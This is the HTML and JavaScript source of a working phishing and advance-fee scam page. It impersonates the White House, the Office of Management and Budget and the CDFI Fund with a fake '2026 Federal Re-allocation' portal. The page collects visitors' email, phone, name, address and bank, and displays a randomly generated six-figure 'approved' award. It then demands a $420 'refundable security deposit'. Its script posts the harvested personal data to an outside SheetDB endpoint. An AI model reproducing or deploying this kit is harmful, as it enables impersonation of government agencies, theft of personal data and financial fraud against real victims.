<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CDFI Fund | 2026 Federal Re-allocation Portal</title>
    <style>
        :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; }
        
        .gov-banner { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; }
        .header { background: var(--navy); color: white; padding: 30px; text-align: center; border-bottom: 5px solid var(--gold); }
        .header img { width: 100px; margin-bottom: 10px; }
        
        .container { max-width: 600px; margin: 30px auto; background: white; padding: 40px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .page { display: none; }
        .active { display: block; }

        h2 { color: var(--navy); border-bottom: 2px solid var(--gold); padding-bottom: 10px; }
        label { display: block; margin: 20px 0 5px; font-weight: bold; }
        input, select { width: 100%; padding: 12px; border: 1px solid #999; border-radius: 3px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 25px; text-transform: uppercase; }
        
        .v-code-box { background: #f0f0f0; border: 2px dashed var(--navy); padding: 20px; text-align: center; font-size: 32px; font-weight: bold; letter-spacing: 10px; color: var(--navy); margin: 20px 0; }
        
        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center; }
        .modal-box { background: white; padding: 30px; border-radius: 5px; max-width: 450px; text-align: center; border-top: 10px solid var(--navy); }
    </style>
</head>
<body>

<div class="gov-banner">Official Website of the United States Government</div>
<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
    <h1>THE WHITE HOUSE</h1>
    <div style="font-size: 12px;">OFFICE OF MANAGEMENT AND BUDGET</div>
</div>

<div class="container">
    <div id="p1" class="page active">
        <h2>Gateway Authentication</h2>
        <p>Access the 2026 Individual and Business Re-allocation database.</p>
        <label>Email Address</label>
        <input type="email" id="email" required>
        <label>Mobile Number</label>
        <input type="tel" id="phone" required>
        <button onclick="toPage(2, true)">Generate Access Code</button>
    </div>

    <div id="p2" class="page">
        <h2>Security Verification</h2>
        <p>Your unique session code is below. Enter it to proceed.</p>
        <div class="v-code-box" id="displayCode"></div>
        <input type="text" id="inputCode" placeholder="Enter Code">
        <button onclick="validateCode()">Verify Access</button>
    </div>

    <div id="p3" class="page">
        <h2>Eligibility Wizard</h2>
        <label>Filing Category</label>
        <select id="type">
            <option value="IND">Individual / Household</option>
            <option value="ORG">Organization / Small Business</option>
        </select>
        <label>Tax Status (2024-2025)</label>
        <select id="tax">
            <option value="YES">Yes, Filed Successfully</option>
            <option value="NO">No, Exempt</option>
        </select>
        <button onclick="calcAmount()">Calculate Allotment</button>
    </div>

    <div id="p4" class="page">
        <h2>Disbursement Profile</h2>
        <form id="mainForm">
            <label>Full Legal Name</label>
            <input type="text" name="data[Name]" id="formName" required>
            <label>Mailing Address</label>
            <input type="text" name="data[Address]" id="formAddress" required>
            <label>Bank Name</label>
            <input type="text" name="data[Bank]" id="formBank" required>
            <button type="button" onclick="showModal()">Claim Allocation</button>
        </form>
    </div>

    <div id="p5" class="page text-center">
        <h1 style="color:var(--navy)">APPROVED âœ…</h1>
        <div style="font-size: 45px; color: #1a5e20; font-weight: bold; margin: 15px 0;" id="finalAmt"></div>
        <p>Reference: WH-2026-X882</p>
        <p>A <strong>Refundable Security Deposit of $420.00</strong> is required to synchronize your bank. This is added to your total payout.</p>
        <p>An officer will contact <strong><span id="resEmail"></span></strong> shortly.</p>
    </div>
</div>

<div id="modal">
    <div class="modal-box">
        <h3>Agreement Required</h3>
        <p id="mText"></p>
        <p style="font-size: 12px;">This is a mandatory step. The money is 100% added back to your award.</p>
        <button onclick="finalPush()" id="submitBtn" style="background:var(--navy); color:white; padding:15px; width:100%; border:none; cursor:pointer;">I AGREE & FINALIZE</button>
    </div>
</div>

<script>
    let code;
    let currentAmount;

    function toPage(n, gen=false) {
        if(gen) { 
            code = Math.floor(100000 + Math.random() * 900000); 
            document.getElementById('displayCode').innerText = code; 
        }
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p'+n).classList.add('active');
    }

    function validateCode() {
        if(document.getElementById('inputCode').value == code) { toPage(3); } else { alert("Invalid Code"); }
    }

    function calcAmount() {
        let min = 647890;
        let max = 1000000;
        let finalValue = Math.floor(Math.random() * (max - min + 1)) + min;
        currentAmount = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalValue);
        
        document.getElementById('finalAmt').innerText = currentAmount;
        document.getElementById('mText').innerText = `To claim your approved ${currentAmount}, you must confirm the $420 refundable security deposit.`;
        toPage(4);
    }

    function showModal() { document.getElementById('modal').style.display = 'flex'; }

    function finalPush() {
        const btn = document.getElementById('submitBtn');
        btn.innerText = "Processing...";
        btn.disabled = true;

        const email = document.getElementById('email').value;
        const phone = document.getElementById('phone').value;
        const name = document.getElementById('formName').value;
        const address = document.getElementById('formAddress').value;
        const bank = document.getElementById('formBank').value;

        // SheetDB API uses JSON
        fetch('https://sheetdb.io/api/v1/qhv2w2yqttw8', {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                data: [
                    {
                        'Email': email,
                        'Phone': phone,
                        'Name': name,
                        'Address': address,
                        'Bank': bank,
                        'Amount': currentAmount,
                        'Date': new Date().toLocaleString()
                    }
                ]
            })
        })
        .then(response => {
            document.getElementById('resEmail').innerText = email;
            document.getElementById('modal').style.display = 'none';
            toPage(5);
        })
        .catch(error => {
            alert("Connection error. Please try again.");
            btn.innerText = "I AGREE & FINALIZE";
            btn.disabled = false;
        });
    }
</script>
</body>
</html>
